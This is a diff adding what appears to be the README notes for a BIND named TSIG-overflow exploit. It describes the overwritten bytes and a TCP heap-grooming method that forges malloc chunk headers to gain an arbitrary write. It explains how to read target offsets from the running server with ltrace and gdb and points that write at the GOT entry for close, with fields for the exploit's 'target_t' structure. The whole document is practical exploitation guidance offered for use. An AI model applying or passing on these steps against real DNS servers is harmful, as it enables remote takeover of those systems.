@@ -1,0 +1,83 @@
+VULNERABILITY INFORMATION
+
+The overflow occurs when BIND overwrites your TSIG record with its own, after
+the end of the question section without proper bounds checking.
+The overwritten data appears to be:
+
+00 00 fa 00 ff 00 00 00 00 ll ll 00 00 00 tt tt tt tt 01 2c 00 00
+id id 00 11 00 00
+
+where:
+  id is the original dns id
+  ll is the rdlength
+  tt is the time it was signed
+
+TCP EXPLOITATION INFORMATION FROM SCUT
+
+With TCP, packet space is allocated on the heap, always in 65536 sized
+chunks. To exploit it one must obtain two packet chunks directly bordering.
+To make named allocate space you must send at least the 2 initial bytes which
+indicate the length of the packet. Creating just 2 allocated packets doesn't
+work because of the many little things which are allocated inbetween
+connections. I still don't have a completely reliable way of getting two
+consecutive packets...
+
+I overwrite the length with 'id id 00 11' where id is the DNS ID in the header
+of the packet you sent. This is set to 0 of course. The advantage with this
+is PREV_INUSE flag is set, so when its freed it doesnt try to consolidate the
+previous block so the prev_size you just overwrote doesnt matter. The actual
+length of the chunk is now 0x10, so there is 8 junk bytes, and then another
+chunk which you can fully control, woohoo ;) malloc should try and consolidate
+the two 'chunks', which should cause an overwrite.....
+
+The layout of the 3rd packet after the overwrite will be:
+
+<prev_size = 0><size = 0x11><junk> ...
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   Overwritten -^
+
+  mark previous as in use-.
+                          v
+<prev_size = 0><size = 0x11><retloc - 12><buffer + 12 + 1>...
+
+  mark previous as not in use-.
+                              v
+<prev_size = 0x10><size = 0x10><junk 8 bytes>
+
+  mark previous as in use-.
+                          v
+<prev_size = 0><size = 0x11><junk 8 bytes>
+
+
+Important - after you send the complete overwrite packet remember to read
+the response frmo the server, it will be about 65545 bytes, otherwise the
+server hangs trying to send you data and the exploit doesn't work.
+
+OFFSETS
+
+Getting offsets for the udp simple method is relatively easy, it just takes
+some single stepping skill, and knowledge of basic stack layout. For the
+complex udp method its very difficult and time-consuming, and i don't
+really have a systematic way of doing it.
+TCP is much easier. Just do:
+
+ltrace -e malloc -p `pidof named`
+
+as root and watch the output as you create three simultaneous connections
+and send two bytes on each. BIND should allocate memory for each connection
+and the one you want is the second one. Add 13, and this is 'buf_addr' in
+target_t. Then just do:
+
+$ gdb /usr/sbin/named
+(gdb) disass close
+Dump of assembler code for function close:
+0x8049fa8 <close>:      jmp    *0x80f7230
+0x8049fae <close+6>:    push   $0xa0
+0x8049fb3 <close+11>:   jmp    0x8049e58
+End of assembler dump.
+(gdb)
+
+The '0x80f7230' is the one you want for 'retloc' in target_t. And thats it!
+Don't you just love the GOT ? :)
+
+or just use find-offset.sh.....
